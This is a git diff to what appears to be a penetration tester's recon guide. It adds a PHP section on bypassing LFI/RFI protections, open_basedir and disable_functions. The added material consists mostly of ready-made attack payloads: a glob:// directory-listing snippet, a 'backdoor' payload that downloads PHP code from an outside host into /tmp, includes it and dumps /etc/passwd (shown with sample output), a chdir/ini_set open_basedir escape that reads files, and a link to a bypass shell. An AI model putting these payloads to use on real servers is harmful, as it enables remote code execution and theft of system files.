@@ -22,7 +22,7 @@
 >
 > **6-Emails**
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption><p>Recon Guide for Pentesters</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>Recon Guide for Pentesters</p></figcaption></figure>
 
 ### **JSfinder to find a JS files**
 
@@ -630,3 +630,75 @@ _RequestVerificationToken=xxxdxxxaxxcxxx&_Username=daffa&_Password=test123
    * Tamper Payment or Critical Fields to manipulate their values
    * Add multiple fields or unexpected fields by abusing HTTP Parameter Pollution & Mass Assignment
    * Response Manipulation to bypass certain restrictions such as 2FA Bypass
+
+## LFI & RFI bypass
+
+* `phpinfo()`
+  * `FPM/FastCGI`
+  * `disable_functions`: `pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail`
+
+<!---->
+
+* [ ] IF Found **`disable_functions & open_basedir`** in PHP try using **`Open basedir`**&#x20;
+*   [ ] \
+
+
+    <figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+    <figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+* [ ] to bypass open\_basedir use **`glob://`**
+
+```php
+<?php
+$file_list = array();
+$it = new DirectoryIterator("glob:///v??/run/*");
+foreach($it as $f) {  
+    $file_list[] = $f->__toString();
+}
+$it = new DirectoryIterator("glob:///v??/run/.*");
+foreach($it as $f) {  
+    $file_list[] = $f->__toString();
+}
+sort($file_list);  
+foreach($file_list as $f){  
+        echo "{$f}<br/>";
+}
+```
+
+**Note1**: In the path you can also use **`/e??/*`** to list **`/etc/*`** and any other folder.
+
+**Note3**: This example is only useful to list folders not to read files
+
+Payload:
+
+```php
+backdoor=
+var_dump(file_put_contents("/tmp/42126aff4925d8592d6042ae2b81de08/a.php", file_get_contents("http://kaibro.tw/ext2")));
+include("/tmp/42126aff4925d8592d6042ae2b81de08/a.php");
+
+var_dump(file_get_contents("/etc/passwd"));
+```
+
+Output:
+
+```bash
+root:x:0:0:root/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+```
+
+* [ ] To change Dir using this&#x20;
+
+```php
+chdir("uploads/");
+ini_set("open_basedir", "/var/www/html:../");
+chdir("../");
+chdir("../");
+chdir("../");
+chdir("../");
+var_dump(scandir('.'), file_get_contents('File_name'));
+```
+
+### Disable\_Function bypass
+
+{% embed url="https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php" %}
